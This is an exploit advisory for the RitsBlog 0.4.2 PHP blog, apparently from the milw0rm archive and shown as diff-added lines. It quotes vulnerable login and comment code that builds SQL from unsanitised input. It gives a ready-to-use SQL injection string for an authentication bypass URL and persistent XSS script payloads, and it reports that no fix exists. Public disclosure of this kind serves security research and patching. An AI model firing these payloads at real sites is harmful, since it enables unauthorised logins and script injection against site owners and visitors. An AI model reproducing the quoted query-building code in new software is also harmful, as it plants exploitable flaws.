@@ -1,0 +1,113 @@
+*******   Salvatore "drosophila" Fresta   *******
+
+[+] Application: RitsBlog
+[+] Version: 0.4.2
+[+] Website: http://sourceforge.net/projects/ritsblog/
+
+[+] Bugs: [A] SQL Injection
+          [B] XSS Persistent
+
+[+] Exploitation: Remote
+[+] Date: 02 Mar 2009
+
+[+] Discovered by: Salvatore "drosophila" Fresta
+[+] Author: Salvatore "drosophila" Fresta
+[+] Contact: e-mail: drosophilaxxx@gmail.com
+
+
+*************************************************
+
+[+] Menu
+
+- [1] Bugs
+- [2] Code
+- [3] Fix
+
+
+*************************************************
+
+[+] Bugs
+
+- [A] SQL Injection
+
+[-] Requisites: magic_quotes_gpc = off
+[-] File affected: ritsBlogAdmin.class.php
+
+This blog is entirely vulnerable to SQL Injection.
+The following is the vulnerable query that can be
+used to bypass authentication.
+
+In jobs.php:
+
+if ($_GET[j] == "login"){
+     if ($blog -> login($_GET[p])){
+         $_SESSION[loggedin] = "ok";
+         $_SESSION[userID] = $blog -> userID;
+         echo "Password found. Loging in...";
+         ....
+
+In ritsBlogAdmin.class.php:
+
+function login($password){
+         global $db;
+         $sql = "select * from users where secretWord  = '$password'";
+         ...
+}
+
+
+- [B] XSS Persistent
+
+[-] Requisites: none
+[-] File affected: ritsBlogAdmin.class.php
+
+In jobs.php:
+
+if ($_POST[j] == "addComment"){
+         echo $blog -> addComment($_POST[id], $_POST[name],
+$_POST[body]);
+}
+
+In ritsBlogAdmin.class.php
+
+function addComment($id, $name, $body){
+         global $db;
+         $sql = "INSERT INTO comments (name, postID, date, text)
+VALUES('" . addslashes($name) . "','" . $id . "',NOW(),'" .
+addslashes($body) . "')";
+         ...
+}
+
+
+*************************************************
+
+[+] Code
+
+- [A] SQL Injection
+
+http://www.site.com/path/blogAdmin/jobs.php?j=login&p=1'or'1'='1
+
+
+- [B] XSS Persistent
+
+It is possible using forms in the index.php or
+to send over POST method the following values:
+
+?j=addComment&id=54&name=myname&body=<script>alert('XSS');</script>
+
+or
+
+?j=addComment&id=54&name=<script>alert('XSS');</script>&body=body
+
+
+*************************************************
+
+[+] Fix
+
+No fix.
+
+
+*************************************************
+
+-- Salvatore "drosophila" Fresta CWNP444351 
+
+# milw0rm.com [2009-03-02]
